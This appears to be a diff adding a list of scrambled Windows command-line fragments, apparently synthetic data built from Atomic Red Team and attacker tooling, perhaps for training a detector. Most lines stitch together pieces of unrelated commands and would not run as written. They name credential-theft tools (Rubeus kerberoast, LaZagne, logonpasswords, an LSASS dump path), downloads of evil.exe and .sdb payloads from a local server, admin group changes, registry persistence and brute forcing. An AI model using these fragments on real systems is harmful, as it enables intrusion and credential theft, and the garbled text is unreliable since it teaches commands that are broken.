@@ -1,0 +1,64 @@
+powershell -executionpolicy bypass -- ' -- net.securityprotocoltype ] ] : :tls12
+hydra -l -- \system32\osk.exe
+iediagcmd.exe /out /f
+get-keystrokes
+namp -sn $ t1547.009 . = user_name } -l $ '' \programdata\microsoft\windows\start \programdata\microsoft\windows\start \system32\osk.exe
+workfolders
+iediagcmd.exe /out $ `` hkey_local_machine\software\microsoft\windows '' \programdata\microsoft\windows\start menu\programs\startup\t1547.009.lnk -- & , cor_profiler = administrators '' ''
+copy $ target = `` cor_profiler '' /f
+net localgroup
+net localgroup administrators `` domain
+net localgroup `` administrators '' /f /grant administrators ''
+subfinder -l $ ( cor_profiler = -name `` cor_profiler '' -name $ '' -c inputprovider '' /d `` $ : /t logon -name `` threadingmodel '' ''
+out-minidump.exe
+bitsadmin.exe /create $ 1
+quser
+reg add `` cor_profiler nt\currentversion\winlogon\notify\atomicredteam '' /f
+curl http : net.webclient ) \\ $ http : //192.168.1.29:9000/payload/evil.exe -o % ) \\ $ _.lastwritetime = shell.createshortcut $ _.log ) )
+net localgroup `` administrators '' /t @ '' file '' /v cor_profiler ;
+get-eventlog advfirewall set windir= $ : domain )
+ffuf -w } -l $ target '' t1547.009 /nowrap ''
+% localappdata % \microsoft\teams\current\teams.exe
+$ wscriptshell = `` http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup administrators '' /f
+$ target = `` $ shell -accepteula `` cor_profiler = cor_profiler = administrators '' '' , '' , threadingmodel ''
+ren $ { filename_regex }
+net localgroup administrators `` hkcu\software\classes\clsid\ `` domain /f
+quser
+$ shortcut = set-wmiinstance file administrators $ { volumn you create -filter `` administrators '' '' ' '' '' , cor_profiler '' c '' c '' -name cor_profiler '' '' ''
+.\hydra -l $ target $ target t1547.009 account `` domain admins '' '' @ administrators '' c `` cor_profiler ;
+stordiag.exe
+rdrleakdiag.exe /p -name `` $ target ; in administrators '' '' $ { filter = @ '' t1547.009 file \system\currentcontrolset\services\winsock2\parameters = \system32\osk.exe
+for `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' '' /f
+net localgroup `` administrators '' /f /grant administrators '' ''
+net localgroup `` administrators '' /v `` cor_profiler '' ''
+net localgroup administrators `` '' '' nt\currentversion\winlogon\notify\atomicredteam '' ''
+net localgroup administrators `` '' '' /v cor_profiler '' /f
+rundll32 -name `` cor_profiler '' ''
+get-childitem -filter `` '' % :logonpasswords -t $ '' / $ : shadow hklm\software\microsoft\active hklm\software\microsoft\windows \users\ -t $ i in $ target = `` '' t1547.009 . -accepteula new-object -comobject components\atomic_test ; ; -t '' $ i ; -t $ ) ;
+rundll32 popcalc.dll file -name administrators '' ''
+quser
+reg add `` domain -name `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 '' -name `` administrators '' '' -name cor_profiler ''
+reg add `` domain c : user_name '' ''
+remove-item -path $ t1547.009 volumn \\ and processor '' c '' in '' c : \programdata\microsoft\windows\start cor_profiler_path -command '' -name $ : autorun '' '' ''
+net user administrator administrator /d `` # { user_name }
+rundll32.exe http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+ffuf -u $ { username } password= $ { command }
+net localgroup `` administrators `` administrators '' /f
+get-ciminstance -classname win32_processor | select-object -expandproperty username
+nbtstat -n
+net localgroup administrators `` domain
+net localgroup administrators '' /t /f
+import-module .\screencap.ps1
+iediagcmd.exe /out /f
+% localappdata % \microsoft\teams\current\teams.exe
+quser
+rundll32 -name `` appinit_dlls
+iediagcmd.exe /out '' $ `` $ { user_name } @ `` autorun $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } -l $ wscriptshell.createshortcut administrators } ;
+rubeus.exe kerberoast windir % file copy \users\ $ { \users\
+reg.exe add `` .\lazagne .. exe all
+esentutl.exe /y administrator
+set windir= $ : cor_profiler = administrators ''
+$ shortcut = `` = copy //192.168.1.29:9000/payload/redirect.sdb -o c : \windows\temp\lsass_dump.dmp
+debugger administrator service isa -command `` $ shadow hklm\system\currentcontrolset\control\session hklm\system\currentcontrolset\control\print\monitors\atomicredteam '' '' /v cor_profiler '' , threadingmodel ''
+iediagcmd.exe /out '' @ $ { cor_profiler = threadingmodel '' -name `` '' c : autorun ''
